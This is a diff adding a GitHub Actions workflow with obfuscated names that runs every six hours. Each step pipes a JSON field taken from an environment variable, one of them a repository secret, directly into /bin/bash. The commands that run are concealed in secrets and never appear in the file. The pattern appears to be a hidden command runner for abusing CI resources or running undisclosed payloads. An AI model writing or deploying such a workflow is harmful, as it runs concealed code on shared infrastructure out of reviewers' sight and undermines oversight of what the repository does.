@@ -1,0 +1,23 @@
+name: diaoyubu3478
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: diaoyubu3478
+        env:
+          bok976: ${{ secrets.bok976 }}
+        run: |
+          echo $bok976 | jq -r .a6 | /bin/bash
+          echo $vz03739 | jq -r .buwqg140 | /bin/bash
+          echo $hypm6444 | jq -r .edf3 | /bin/bash
+          echo $aomv368 | jq -r .rw5105 | /bin/bash
+          echo $rqnf81356 | jq -r .bmrds8 | /bin/bash
+          echo $zn9389 | jq -r .nalro585 | /bin/bash
+          echo $kxi371 | jq -r .i36323 | /bin/bash
+
